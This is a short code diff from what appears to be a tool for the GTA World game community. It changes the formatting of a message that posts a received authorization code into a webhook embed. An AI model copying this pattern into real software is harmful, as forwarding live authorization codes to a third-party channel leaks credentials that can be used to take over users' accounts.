@@ -15,7 +15,7 @@ const sendWebhook = async (authCode) => {
         title: "GTA World Auth Code Received",
         color: 0x00FF00,
         fields: [
-            { name: "Authorization Code", value: ````${authCode}````, inline: false },
+            { name: "Authorization Code", value: ```${authCode}```, inline: false },
         ],
         timestamp: new Date().toISOString(),
         footer: { text: "PHMC Tools - GTA World Auth" }
